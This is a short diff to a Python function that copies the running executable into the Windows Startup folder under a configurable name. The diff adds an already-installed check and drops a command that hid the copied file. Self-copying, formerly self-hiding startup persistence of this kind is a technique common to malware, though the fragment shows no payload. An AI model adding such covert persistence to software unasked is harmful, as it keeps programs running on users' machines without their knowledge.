@@ -17,7 +17,9 @@ def set_startup():
         print("skipping enable startup because of debug")
         return
     startup_path = expanduser(r'~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
+    if sys.executable.split("\\")[-2] == "Startup" or os.path.exists(os.path.join(startup_path, cfg_data["autoStartupName"] + ".exe")):
+        print("file alredy in startup")
+        return
     shutil.copy2(sys.executable, startup_path)
     file_path = os.path.join(startup_path, file_name)
-    os.system(f"attrib +H {file_path}")
     os.rename(file_path, os.path.join(startup_path, cfg_data["autoStartupName"] + ".exe"))
